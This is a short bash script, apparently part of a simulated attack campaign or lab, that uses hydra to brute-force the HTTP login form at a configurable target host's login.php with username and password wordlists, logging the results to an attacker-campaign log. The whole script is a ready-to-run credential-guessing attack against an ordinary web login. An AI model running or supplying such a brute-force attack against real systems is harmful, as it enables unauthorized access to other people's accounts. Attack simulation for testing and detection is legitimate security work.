#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

log "BRUTEFORCE" "Starting hydra HTTP form brute-force against ${TARGET_HOST}/login.php"
hydra -L /scripts/wordlists/users.txt -P /scripts/wordlists/passwords.txt \
  -o "$LOG_DIR/hydra-http-$(date +%s).txt" \
  "$TARGET_HOST" http-get-form "/login.php?user=^USER^&pass=^PASS^:status=fail" \
  2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"
log "BRUTEFORCE" "hydra HTTP form brute-force complete"
